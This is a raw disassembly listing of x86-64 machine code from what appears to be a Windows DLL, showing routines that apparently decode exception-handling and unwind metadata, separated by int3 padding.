   1800030f6:	41 0f b6 0a          	movzbl (%r10),%ecx
   1800030fa:	83 e1 0f             	and    $0xf,%ecx
   1800030fd:	48 0f be 84 29 c0 24 	movsbq 0x124c0(%rcx,%rbp,1),%rax
   180003104:	01 00 
   180003106:	0f b6 8c 29 d0 24 01 	movzbl 0x124d0(%rcx,%rbp,1),%ecx
   18000310d:	00 
   18000310e:	4c 2b d0             	sub    %rax,%r10
   180003111:	41 8b 42 fc          	mov    -0x4(%r10),%eax
   180003115:	d3 e8                	shr    %cl,%eax
   180003117:	89 42 04             	mov    %eax,0x4(%rdx)
   18000311a:	f6 c3 08             	test   $0x8,%bl
   18000311d:	74 0a                	je     0x180003129
   18000311f:	41 8b 02             	mov    (%r10),%eax
   180003122:	49 83 c2 04          	add    $0x4,%r10
   180003126:	89 42 08             	mov    %eax,0x8(%rdx)
   180003129:	f6 c3 10             	test   $0x10,%bl
   18000312c:	74 0a                	je     0x180003138
   18000312e:	41 8b 02             	mov    (%r10),%eax
   180003131:	49 83 c2 04          	add    $0x4,%r10
   180003135:	89 42 0c             	mov    %eax,0xc(%rdx)
   180003138:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   18000313d:	4d 8d 42 04          	lea    0x4(%r10),%r8
   180003141:	75 62                	jne    0x1800031a5
   180003143:	f6 c3 02             	test   $0x2,%bl
   180003146:	74 5d                	je     0x1800031a5
   180003148:	c7 42 10 00 00 00 00 	movl   $0x0,0x10(%rdx)
   18000314f:	49 63 02             	movslq (%r10),%rax
   180003152:	85 c0                	test   %eax,%eax
   180003154:	74 46                	je     0x18000319c
   180003156:	49 03 c1             	add    %r9,%rax
   180003159:	0f b6 08             	movzbl (%rax),%ecx
   18000315c:	83 e1 0f             	and    $0xf,%ecx
   18000315f:	48 0f be 94 29 c0 24 	movsbq 0x124c0(%rcx,%rbp,1),%rdx
   180003166:	01 00 
   180003168:	0f b6 8c 29 d0 24 01 	movzbl 0x124d0(%rcx,%rbp,1),%ecx
   18000316f:	00 
   180003170:	48 2b c2             	sub    %rdx,%rax
   180003173:	33 d2                	xor    %edx,%edx
   180003175:	44 8b 50 fc          	mov    -0x4(%rax),%r10d
   180003179:	41 d3 ea             	shr    %cl,%r10d
   18000317c:	45 85 d2             	test   %r10d,%r10d
   18000317f:	74 2a                	je     0x1800031ab
   180003181:	44 8b 48 04          	mov    0x4(%rax),%r9d
   180003185:	39 38                	cmp    %edi,(%rax)
   180003187:	74 0d                	je     0x180003196
   180003189:	48 83 c0 08          	add    $0x8,%rax
   18000318d:	ff c2                	inc    %edx
   18000318f:	41 3b d2             	cmp    %r10d,%edx
   180003192:	72 ed                	jb     0x180003181
   180003194:	eb 15                	jmp    0x1800031ab
   180003196:	45 89 4b 10          	mov    %r9d,0x10(%r11)
   18000319a:	eb 0f                	jmp    0x1800031ab
   18000319c:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800031a1:	cd 29                	int    $0x29
   1800031a3:	eb 06                	jmp    0x1800031ab
   1800031a5:	41 8b 02             	mov    (%r10),%eax
   1800031a8:	89 42 10             	mov    %eax,0x10(%rdx)
   1800031ab:	f6 c3 01             	test   $0x1,%bl
   1800031ae:	74 25                	je     0x1800031d5
   1800031b0:	41 0f b6 08          	movzbl (%r8),%ecx
   1800031b4:	83 e1 0f             	and    $0xf,%ecx
   1800031b7:	48 0f be 84 29 c0 24 	movsbq 0x124c0(%rcx,%rbp,1),%rax
   1800031be:	01 00 
   1800031c0:	0f b6 8c 29 d0 24 01 	movzbl 0x124d0(%rcx,%rbp,1),%ecx
   1800031c7:	00 
   1800031c8:	4c 2b c0             	sub    %rax,%r8
   1800031cb:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   1800031cf:	d3 e8                	shr    %cl,%eax
   1800031d1:	41 89 43 14          	mov    %eax,0x14(%r11)
   1800031d5:	4c 2b c6             	sub    %rsi,%r8
   1800031d8:	49 8b c0             	mov    %r8,%rax
   1800031db:	5f                   	pop    %rdi
   1800031dc:	5e                   	pop    %rsi
   1800031dd:	5d                   	pop    %rbp
   1800031de:	5b                   	pop    %rbx
   1800031df:	c3                   	ret
   1800031e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800031e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800031ea:	57                   	push   %rdi
   1800031eb:	48 83 ec 20          	sub    $0x20,%rsp
   1800031ef:	48 8b f2             	mov    %rdx,%rsi
   1800031f2:	48 8b d1             	mov    %rcx,%rdx
   1800031f5:	48 8b ce             	mov    %rsi,%rcx
   1800031f8:	e8 33 15 00 00       	call   0x180004730
   1800031fd:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   180003200:	8b f8                	mov    %eax,%edi
   180003202:	85 db                	test   %ebx,%ebx
   180003204:	74 28                	je     0x18000322e
   180003206:	ff cb                	dec    %ebx
   180003208:	e8 b3 11 00 00       	call   0x1800043c0
   18000320d:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   180003211:	48 8b 48 60          	mov    0x60(%rax),%rcx
   180003215:	4c 8d 04 91          	lea    (%rcx,%rdx,4),%r8
   180003219:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   18000321d:	49 03 c8             	add    %r8,%rcx
   180003220:	3b 79 04             	cmp    0x4(%rcx),%edi
   180003223:	7e 05                	jle    0x18000322a
   180003225:	3b 79 08             	cmp    0x8(%rcx),%edi
   180003228:	7e 06                	jle    0x180003230
   18000322a:	85 db                	test   %ebx,%ebx
   18000322c:	75 d8                	jne    0x180003206
   18000322e:	33 c9                	xor    %ecx,%ecx
   180003230:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003235:	48 85 c9             	test   %rcx,%rcx
   180003238:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000323d:	0f 95 c0             	setne  %al
   180003240:	48 83 c4 20          	add    $0x20,%rsp
   180003244:	5f                   	pop    %rdi
   180003245:	c3                   	ret
   180003246:	cc                   	int3
   180003247:	cc                   	int3
   180003248:	cc                   	int3
   180003249:	cc                   	int3
   18000324a:	cc                   	int3
   18000324b:	cc                   	int3
   18000324c:	cc                   	int3
   18000324d:	cc                   	int3
   18000324e:	cc                   	int3
   18000324f:	cc                   	int3
   180003250:	0f b6 02             	movzbl (%rdx),%eax
   180003253:	24 01                	and    $0x1,%al
   180003255:	c3                   	ret
   180003256:	cc                   	int3
   180003257:	cc                   	int3
   180003258:	cc                   	int3
   180003259:	cc                   	int3
   18000325a:	cc                   	int3
   18000325b:	cc                   	int3
   18000325c:	cc                   	int3
   18000325d:	cc                   	int3
   18000325e:	cc                   	int3
   18000325f:	cc                   	int3
   180003260:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003265:	55                   	push   %rbp
   180003266:	56                   	push   %rsi
   180003267:	57                   	push   %rdi
   180003268:	41 56                	push   %r14
   18000326a:	41 57                	push   %r15
   18000326c:	48 83 ec 20          	sub    $0x20,%rsp
   180003270:	41 8b 78 0c          	mov    0xc(%r8),%edi
   180003274:	4c 8b f9             	mov    %rcx,%r15
   180003277:	49 8b c8             	mov    %r8,%rcx
   18000327a:	49 8b f0             	mov    %r8,%rsi
   18000327d:	4c 8b f2             	mov    %rdx,%r14
   180003280:	e8 ab 14 00 00       	call   0x180004730
   180003285:	4d 8b 0f             	mov    (%r15),%r9
   180003288:	8b e8                	mov    %eax,%ebp
   18000328a:	4c 89 4c 24 50       	mov    %r9,0x50(%rsp)
   18000328f:	85 ff                	test   %edi,%edi
   180003291:	0f 84 8e 00 00 00    	je     0x180003325
   180003297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000329e:	00 00 
   1800032a0:	48 63 46 10          	movslq 0x10(%rsi),%rax
   1800032a4:	ff cf                	dec    %edi
   1800032a6:	48 8d 14 bf          	lea    (%rdi,%rdi,4),%rdx
   1800032aa:	48 8d 1c 90          	lea    (%rax,%rdx,4),%rbx
   1800032ae:	49 03 5e 08          	add    0x8(%r14),%rbx
   1800032b2:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   1800032b5:	7e 53                	jle    0x18000330a
   1800032b7:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   1800032ba:	7f 4e                	jg     0x18000330a
   1800032bc:	49 8b 0e             	mov    (%r14),%rcx
   1800032bf:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800032c4:	45 33 c0             	xor    %r8d,%r8d
   1800032c7:	ff 15 b3 ed 00 00    	call   *0xedb3(%rip)        # 0x180012080
   1800032cd:	4c 63 4b 10          	movslq 0x10(%rbx),%r9
   1800032d1:	4c 03 4c 24 60       	add    0x60(%rsp),%r9
   1800032d6:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   1800032da:	44 8b 10             	mov    (%rax),%r10d
   1800032dd:	33 c0                	xor    %eax,%eax
   1800032df:	45 85 c0             	test   %r8d,%r8d
   1800032e2:	74 21                	je     0x180003305
   1800032e4:	0f 1f 40 00          	nopl   0x0(%rax)
   1800032e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800032ef:	00 
   1800032f0:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   1800032f4:	49 63 4c 91 0c       	movslq 0xc(%r9,%rdx,4),%rcx
   1800032f9:	49 3b ca             	cmp    %r10,%rcx
   1800032fc:	74 12                	je     0x180003310
   1800032fe:	ff c0                	inc    %eax
   180003300:	41 3b c0             	cmp    %r8d,%eax
   180003303:	72 eb                	jb     0x1800032f0
   180003305:	41 3b c0             	cmp    %r8d,%eax
   180003308:	72 06                	jb     0x180003310
   18000330a:	85 ff                	test   %edi,%edi
   18000330c:	75 92                	jne    0x1800032a0
   18000330e:	eb 15                	jmp    0x180003325
   180003310:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180003314:	49 63 4c 81 10       	movslq 0x10(%r9,%rax,4),%rcx
   180003319:	49 8b 07             	mov    (%r15),%rax
   18000331c:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180003320:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   180003325:	49 8b d6             	mov    %r14,%rdx
   180003328:	48 8b ce             	mov    %rsi,%rcx
   18000332b:	e8 00 14 00 00       	call   0x180004730
   180003330:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   180003333:	8b f8                	mov    %eax,%edi
   180003335:	85 db                	test   %ebx,%ebx
   180003337:	74 2e                	je     0x180003367
   180003339:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003340:	e8 7b 10 00 00       	call   0x1800043c0
   180003345:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   180003349:	ff cb                	dec    %ebx
   18000334b:	48 03 48 60          	add    0x60(%rax),%rcx
   18000334f:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   180003353:	44 8b 4c 91 04       	mov    0x4(%rcx,%rdx,4),%r9d
   180003358:	41 3b f9             	cmp    %r9d,%edi
   18000335b:	7e 06                	jle    0x180003363
   18000335d:	3b 7c 91 08          	cmp    0x8(%rcx,%rdx,4),%edi
   180003361:	7e 0a                	jle    0x18000336d
   180003363:	85 db                	test   %ebx,%ebx
   180003365:	75 d9                	jne    0x180003340
   180003367:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   18000336d:	4c 8b c6             	mov    %rsi,%r8
   180003370:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003375:	49 8b d6             	mov    %r14,%rdx
   180003378:	e8 83 3c 00 00       	call   0x180007000
   18000337d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180003382:	48 83 c4 20          	add    $0x20,%rsp
   180003386:	41 5f                	pop    %r15
   180003388:	41 5e                	pop    %r14
   18000338a:	5f                   	pop    %rdi
   18000338b:	5e                   	pop    %rsi
   18000338c:	5d                   	pop    %rbp
   18000338d:	c3                   	ret
   18000338e:	cc                   	int3
   18000338f:	cc                   	int3
   180003390:	48 83 ec 28          	sub    $0x28,%rsp
   180003394:	41 f6 00 01          	testb  $0x1,(%r8)
   180003398:	48 8b 09             	mov    (%rcx),%rcx
   18000339b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800033a0:	74 0d                	je     0x1800033af
   1800033a2:	41 8b 40 14          	mov    0x14(%r8),%eax
   1800033a6:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   1800033aa:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800033af:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   1800033b5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800033ba:	e8 f1 3d 00 00       	call   0x1800071b0
   1800033bf:	48 83 c4 28          	add    $0x28,%rsp
   1800033c3:	c3                   	ret
   1800033c4:	cc                   	int3
   1800033c5:	cc                   	int3
   1800033c6:	cc                   	int3
   1800033c7:	cc                   	int3
   1800033c8:	cc                   	int3
   1800033c9:	cc                   	int3
   1800033ca:	cc                   	int3
   1800033cb:	cc                   	int3
   1800033cc:	cc                   	int3
   1800033cd:	cc                   	int3
   1800033ce:	cc                   	int3
   1800033cf:	cc                   	int3
   1800033d0:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800033d5:	56                   	push   %rsi
   1800033d6:	57                   	push   %rdi
   1800033d7:	41 54                	push   %r12
   1800033d9:	41 56                	push   %r14
   1800033db:	41 57                	push   %r15
   1800033dd:	48 83 ec 20          	sub    $0x20,%rsp
   1800033e1:	41 8b 78 0c          	mov    0xc(%r8),%edi
   1800033e5:	4c 8b e1             	mov    %rcx,%r12
   1800033e8:	49 8b c8             	mov    %r8,%rcx
   1800033eb:	4d 8b f1             	mov    %r9,%r14
   1800033ee:	49 8b e8             	mov    %r8,%rbp
   1800033f1:	4c 8b fa             	mov    %rdx,%r15
   1800033f4:	e8 37 13 00 00       	call   0x180004730
   1800033f9:	4d 8b 14 24          	mov    (%r12),%r10
   1800033fd:	8b f0                	mov    %eax,%esi
   1800033ff:	4d 89 16             	mov    %r10,(%r14)
   180003402:	85 ff                	test   %edi,%edi
   180003404:	0f 84 a4 00 00 00    	je     0x1800034ae
   18000340a:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   18000340f:	90                   	nop
   180003410:	48 63 45 10          	movslq 0x10(%rbp),%rax
   180003414:	ff cf                	dec    %edi
   180003416:	48 8d 14 bf          	lea    (%rdi,%rdi,4),%rdx
   18000341a:	48 8d 1c 90          	lea    (%rax,%rdx,4),%rbx
   18000341e:	49 03 5f 08          	add    0x8(%r15),%rbx
   180003422:	3b 73 04             	cmp    0x4(%rbx),%esi
   180003425:	7e 53                	jle    0x18000347a
   180003427:	3b 73 08             	cmp    0x8(%rbx),%esi
   18000342a:	7f 4e                	jg     0x18000347a
   18000342c:	49 8b 0f             	mov    (%r15),%rcx
   18000342f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003434:	45 33 c0             	xor    %r8d,%r8d
   180003437:	ff 15 43 ec 00 00    	call   *0xec43(%rip)        # 0x180012080
   18000343d:	4c 63 4b 10          	movslq 0x10(%rbx),%r9
   180003441:	4c 03 4c 24 50       	add    0x50(%rsp),%r9
   180003446:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   18000344a:	44 8b 10             	mov    (%rax),%r10d
   18000344d:	33 c0                	xor    %eax,%eax
   18000344f:	45 85 c0             	test   %r8d,%r8d
   180003452:	74 21                	je     0x180003475
   180003454:	0f 1f 40 00          	nopl   0x0(%rax)
   180003458:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000345f:	00 
   180003460:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   180003464:	49 63 4c 91 0c       	movslq 0xc(%r9,%rdx,4),%rcx
   180003469:	49 3b ca             	cmp    %r10,%rcx
   18000346c:	74 12                	je     0x180003480
   18000346e:	ff c0                	inc    %eax
   180003470:	41 3b c0             	cmp    %r8d,%eax
   180003473:	72 eb                	jb     0x180003460
   180003475:	41 3b c0             	cmp    %r8d,%eax
   180003478:	72 06                	jb     0x180003480
   18000347a:	85 ff                	test   %edi,%edi
   18000347c:	75 92                	jne    0x180003410
   18000347e:	eb 14                	jmp    0x180003494
   180003480:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180003484:	49 63 4c 81 10       	movslq 0x10(%r9,%rax,4),%rcx
   180003489:	49 8b 04 24          	mov    (%r12),%rax
   18000348d:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180003491:	49 89 0e             	mov    %rcx,(%r14)
   180003494:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180003499:	49 8b c6             	mov    %r14,%rax
   18000349c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1800034a1:	48 83 c4 20          	add    $0x20,%rsp
   1800034a5:	41 5f                	pop    %r15
   1800034a7:	41 5e                	pop    %r14
   1800034a9:	41 5c                	pop    %r12
   1800034ab:	5f                   	pop    %rdi
   1800034ac:	5e                   	pop    %rsi
   1800034ad:	c3                   	ret
   1800034ae:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1800034b3:	49 8b c6             	mov    %r14,%rax
   1800034b6:	48 83 c4 20          	add    $0x20,%rsp
   1800034ba:	41 5f                	pop    %r15
   1800034bc:	41 5e                	pop    %r14
   1800034be:	41 5c                	pop    %r12
   1800034c0:	5f                   	pop    %rdi
   1800034c1:	5e                   	pop    %rsi
   1800034c2:	c3                   	ret
   1800034c3:	cc                   	int3
   1800034c4:	cc                   	int3
   1800034c5:	cc                   	int3
   1800034c6:	cc                   	int3
   1800034c7:	cc                   	int3
   1800034c8:	cc                   	int3
   1800034c9:	cc                   	int3
   1800034ca:	cc                   	int3
   1800034cb:	cc                   	int3
   1800034cc:	cc                   	int3
   1800034cd:	cc                   	int3
   1800034ce:	cc                   	int3
   1800034cf:	cc                   	int3
   1800034d0:	48 8b 01             	mov    (%rcx),%rax
   1800034d3:	48 8b d1             	mov    %rcx,%rdx
   1800034d6:	49 89 01             	mov    %rax,(%r9)
   1800034d9:	41 f6 00 01          	testb  $0x1,(%r8)
   1800034dd:	74 0e                	je     0x1800034ed
   1800034df:	41 8b 48 14          	mov    0x14(%r8),%ecx
   1800034e3:	48 8b 02             	mov    (%rdx),%rax
   1800034e6:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   1800034ea:	49 89 09             	mov    %rcx,(%r9)
   1800034ed:	49 8b c1             	mov    %r9,%rax
   1800034f0:	c3                   	ret
   1800034f1:	cc                   	int3
   1800034f2:	cc                   	int3
   1800034f3:	cc                   	int3
   1800034f4:	cc                   	int3
   1800034f5:	cc                   	int3
   1800034f6:	cc                   	int3
   1800034f7:	cc                   	int3
   1800034f8:	cc                   	int3
   1800034f9:	cc                   	int3
   1800034fa:	cc                   	int3
   1800034fb:	cc                   	int3
   1800034fc:	cc                   	int3
   1800034fd:	cc                   	int3
   1800034fe:	cc                   	int3
   1800034ff:	cc                   	int3
   180003500:	40 53                	rex push %rbx
   180003502:	55                   	push   %rbp
   180003503:	56                   	push   %rsi
   180003504:	57                   	push   %rdi
   180003505:	41 54                	push   %r12
   180003507:	41 56                	push   %r14
   180003509:	48 83 ec 38          	sub    $0x38,%rsp
   18000350d:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   180003514:	00 
   180003515:	4c 8b e2             	mov    %rdx,%r12
   180003518:	4c 8b f1             	mov    %rcx,%r14
   18000351b:	49 8b d1             	mov    %r9,%rdx
   18000351e:	48 8b cb             	mov    %rbx,%rcx
   180003521:	49 8b f9             	mov    %r9,%rdi
   180003524:	41 8b f0             	mov    %r8d,%esi
   180003527:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   18000352a:	e8 01 12 00 00       	call   0x180004730
   18000352f:	44 8b d0             	mov    %eax,%r10d
   180003532:	85 ed                	test   %ebp,%ebp
   180003534:	0f 84 ed 00 00 00    	je     0x180003627
   18000353a:	4c 8b 5f 08          	mov    0x8(%rdi),%r11
   18000353e:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   180003544:	48 63 5b 10          	movslq 0x10(%rbx),%rbx
   180003548:	8b d5                	mov    %ebp,%edx
   18000354a:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   18000354f:	45 8b f9             	mov    %r9d,%r15d
   180003552:	49 8d 3c 1b          	lea    (%r11,%rbx,1),%rdi
   180003556:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000355d:	00 00 00 
   180003560:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   180003564:	4b 8d 0c 80          	lea    (%r8,%r8,4),%rcx
   180003568:	49 8d 04 8b          	lea    (%r11,%rcx,4),%rax
   18000356c:	44 3b 54 18 04       	cmp    0x4(%rax,%rbx,1),%r10d
   180003571:	7e 0b                	jle    0x18000357e
   180003573:	44 3b 54 8f 08       	cmp    0x8(%rdi,%rcx,4),%r10d
   180003578:	0f 8e 93 00 00 00    	jle    0x180003611
   18000357e:	41 8b d0             	mov    %r8d,%edx
   180003581:	45 85 c0             	test   %r8d,%r8d
   180003584:	75 da                	jne    0x180003560
   180003586:	45 33 d2             	xor    %r10d,%r10d
   180003589:	45 8b c2             	mov    %r10d,%r8d
   18000358c:	41 8b d2             	mov    %r10d,%edx
   18000358f:	90                   	nop
   180003590:	8b c2                	mov    %edx,%eax
   180003592:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180003596:	4d 85 c0             	test   %r8,%r8
   180003599:	74 13                	je     0x1800035ae
   18000359b:	41 8b 40 04          	mov    0x4(%r8),%eax
   18000359f:	39 04 8f             	cmp    %eax,(%rdi,%rcx,4)
   1800035a2:	7e 20                	jle    0x1800035c4
   1800035a4:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800035a8:	39 44 8f 04          	cmp    %eax,0x4(%rdi,%rcx,4)
   1800035ac:	7f 16                	jg     0x1800035c4
   1800035ae:	3b 34 8f             	cmp    (%rdi,%rcx,4),%esi
   1800035b1:	7c 11                	jl     0x1800035c4
   1800035b3:	3b 74 8f 04          	cmp    0x4(%rdi,%rcx,4),%esi
   1800035b7:	7f 0b                	jg     0x1800035c4
   1800035b9:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   1800035bd:	44 8b fa             	mov    %edx,%r15d
   1800035c0:	44 0f 44 ca          	cmove  %edx,%r9d
   1800035c4:	ff c2                	inc    %edx
   1800035c6:	3b d5                	cmp    %ebp,%edx
   1800035c8:	72 c6                	jb     0x180003590
   1800035ca:	41 8b c2             	mov    %r10d,%eax
   1800035cd:	4d 89 26             	mov    %r12,(%r14)
   1800035d0:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   1800035d4:	4d 89 66 10          	mov    %r12,0x10(%r14)
   1800035d8:	41 0f 45 c1          	cmovne %r9d,%eax
   1800035dc:	41 89 46 08          	mov    %eax,0x8(%r14)
   1800035e0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800035e4:	41 89 46 0c          	mov    %eax,0xc(%r14)
   1800035e8:	41 8d 47 01          	lea    0x1(%r15),%eax
   1800035ec:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   1800035f1:	44 0f 45 d0          	cmovne %eax,%r10d
   1800035f5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800035f9:	41 89 46 1c          	mov    %eax,0x1c(%r14)
   1800035fd:	49 8b c6             	mov    %r14,%rax
   180003600:	45 89 56 18          	mov    %r10d,0x18(%r14)
   180003604:	48 83 c4 38          	add    $0x38,%rsp
   180003608:	41 5e                	pop    %r14
   18000360a:	41 5c                	pop    %r12
   18000360c:	5f                   	pop    %rdi
   18000360d:	5e                   	pop    %rsi
   18000360e:	5d                   	pop    %rbp
   18000360f:	5b                   	pop    %rbx
   180003610:	c3                   	ret
   180003611:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180003614:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180003618:	4d 8d 04 83          	lea    (%r11,%rax,4),%r8
   18000361c:	4c 03 c3             	add    %rbx,%r8
   18000361f:	45 33 d2             	xor    %r10d,%r10d
   180003622:	e9 65 ff ff ff       	jmp    0x18000358c
   180003627:	e8 34 5a 00 00       	call   0x180009060
   18000362c:	cc                   	int3
   18000362d:	cc                   	int3
   18000362e:	cc                   	int3
   18000362f:	cc                   	int3
   180003630:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003635:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000363a:	56                   	push   %rsi
   18000363b:	57                   	push   %rdi
   18000363c:	41 54                	push   %r12
   18000363e:	41 55                	push   %r13
   180003640:	41 56                	push   %r14
   180003642:	48 83 ec 30          	sub    $0x30,%rsp
   180003646:	8b 5c 24 2c          	mov    0x2c(%rsp),%ebx
   18000364a:	48 8b fa             	mov    %rdx,%rdi
   18000364d:	4c 8b f1             	mov    %rcx,%r14
   180003650:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180003655:	33 f6                	xor    %esi,%esi
   180003657:	89 5c 24 2c          	mov    %ebx,0x2c(%rsp)
   18000365b:	48 8b cf             	mov    %rdi,%rcx
   18000365e:	89 74 24 28          	mov    %esi,0x28(%rsp)
   180003662:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180003667:	41 8b e8             	mov    %r8d,%ebp
   18000366a:	45 33 ed             	xor    %r13d,%r13d
   18000366d:	e8 ee 03 00 00       	call   0x180003a60
   180003672:	44 8b 27             	mov    (%rdi),%r12d
   180003675:	45 85 e4             	test   %r12d,%r12d
   180003678:	0f 84 d7 00 00 00    	je     0x180003755
   18000367e:	44 8b 5f 18          	mov    0x18(%rdi),%r11d
   180003682:	48 8d 1d 77 c9 ff ff 	lea    -0x3689(%rip),%rbx        # 0x180000000
   180003689:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   18000368e:	45 33 d2             	xor    %r10d,%r10d
   180003691:	4c 8b 7f 08          	mov    0x8(%rdi),%r15
   180003695:	41 3b eb             	cmp    %r11d,%ebp
   180003698:	7c 12                	jl     0x1800036ac
   18000369a:	3b 6f 1c             	cmp    0x1c(%rdi),%ebp
   18000369d:	7f 0d                	jg     0x1800036ac
   18000369f:	85 f6                	test   %esi,%esi
   1800036a1:	41 8b c2             	mov    %r10d,%eax
   1800036a4:	45 8b ea             	mov    %r10d,%r13d
   1800036a7:	0f 44 c6             	cmove  %esi,%eax
   1800036aa:	8b f0                	mov    %eax,%esi
   1800036ac:	41 0f b6 0f          	movzbl (%r15),%ecx
   1800036b0:	49 8b c7             	mov    %r15,%rax
   1800036b3:	83 e1 0f             	and    $0xf,%ecx
   1800036b6:	49 8b d7             	mov    %r15,%rdx
   1800036b9:	41 ff c2             	inc    %r10d
   1800036bc:	4c 0f be 8c 19 c0 24 	movsbq 0x124c0(%rcx,%rbx,1),%r9
   1800036c3:	01 00 
   1800036c5:	0f b6 8c 19 d0 24 01 	movzbl 0x124d0(%rcx,%rbx,1),%ecx
   1800036cc:	00 
   1800036cd:	49 2b c1             	sub    %r9,%rax
   1800036d0:	44 8b 58 fc          	mov    -0x4(%rax),%r11d
   1800036d4:	48 89 47 08          	mov    %rax,0x8(%rdi)
   1800036d8:	41 d3 eb             	shr    %cl,%r11d
   1800036db:	44 89 5f 18          	mov    %r11d,0x18(%rdi)
   1800036df:	0f b6 08             	movzbl (%rax),%ecx
   1800036e2:	83 e1 0f             	and    $0xf,%ecx
   1800036e5:	4c 0f be 84 19 c0 24 	movsbq 0x124c0(%rcx,%rbx,1),%r8
   1800036ec:	01 00 
   1800036ee:	0f b6 8c 19 d0 24 01 	movzbl 0x124d0(%rcx,%rbx,1),%ecx
   1800036f5:	00 
   1800036f6:	49 2b d0             	sub    %r8,%rdx
   1800036f9:	49 2b d1             	sub    %r9,%rdx
   1800036fc:	8b 42 fc             	mov    -0x4(%rdx),%eax
   1800036ff:	d3 e8                	shr    %cl,%eax
   180003701:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   180003705:	89 47 1c             	mov    %eax,0x1c(%rdi)
   180003708:	0f b6 0a             	movzbl (%rdx),%ecx
   18000370b:	83 e1 0f             	and    $0xf,%ecx
   18000370e:	48 0f be 84 19 c0 24 	movsbq 0x124c0(%rcx,%rbx,1),%rax
   180003715:	01 00 
   180003717:	0f b6 8c 19 d0 24 01 	movzbl 0x124d0(%rcx,%rbx,1),%ecx
   18000371e:	00 
   18000371f:	4c 2b f8             	sub    %rax,%r15
   180003722:	4d 2b f8             	sub    %r8,%r15
   180003725:	4d 2b f9             	sub    %r9,%r15
   180003728:	41 8b 47 fc          	mov    -0x4(%r15),%eax
   18000372c:	d3 e8                	shr    %cl,%eax
   18000372e:	4c 89 7f 08          	mov    %r15,0x8(%rdi)
   180003732:	89 47 20             	mov    %eax,0x20(%rdi)
   180003735:	41 8b 07             	mov    (%r15),%eax
   180003738:	49 83 c7 04          	add    $0x4,%r15
   18000373c:	4c 89 7f 08          	mov    %r15,0x8(%rdi)
   180003740:	89 47 24             	mov    %eax,0x24(%rdi)
   180003743:	45 3b d4             	cmp    %r12d,%r10d
   180003746:	0f 85 49 ff ff ff    	jne    0x180003695
   18000374c:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   180003751:	8b 5c 24 2c          	mov    0x2c(%rsp),%ebx
   180003755:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000375a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000375f:	48 8b cf             	mov    %rdi,%rcx
   180003762:	89 74 24 28          	mov    %esi,0x28(%rsp)
   180003766:	89 5c 24 2c          	mov    %ebx,0x2c(%rsp)
   18000376a:	e8 f1 02 00 00       	call   0x180003a60
